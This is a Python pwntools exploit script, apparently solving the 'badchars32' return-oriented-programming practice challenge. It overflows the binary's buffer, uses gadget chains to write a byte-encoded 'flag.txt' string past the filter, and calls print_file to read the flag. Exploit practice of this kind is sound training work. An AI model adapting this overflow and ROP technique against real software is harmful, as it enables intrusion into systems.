from pwn import *

elf = ELF("./badchars32")

p = process("./badchars32")
p.recvuntil('> ')

mov_edi_esi = p32(0x0804854f)
pop_esi_edi_ebp = p32(0x080485b9)
writable_area = 0x0804a018
pop_ebx = p32(0x0804839d)
add_ebp_bl = p32(0x08048543) 
xor_ebp_bl = p32(0x08048547)
pop_ebp = 0x080485bb
# pop ebx per ricavare bl, pop ebp per ricavare [ebp], gadget add

rop = b''
rop += pop_esi_edi_ebp + b'dj_e' + p32(writable_area) + b'aaaa' + mov_edi_esi 
rop += pop_esi_edi_ebp + b',rvr' + p32(writable_area + 4) + b'aaaa' + mov_edi_esi 

for i in range(8):
	rop += p32(pop_ebp) + p32(writable_area + i)
	rop += pop_ebx + p32(2) + add_ebp_bl
rop += p32(elf.symbols['print_file']) + b'aaaa' + p32(writable_area)

p.send(44*b'a' + rop)
					   

p.interactive()

#p.clean()
#p.sendline(b'cat flag.txt')
#print(p.recv().decode())

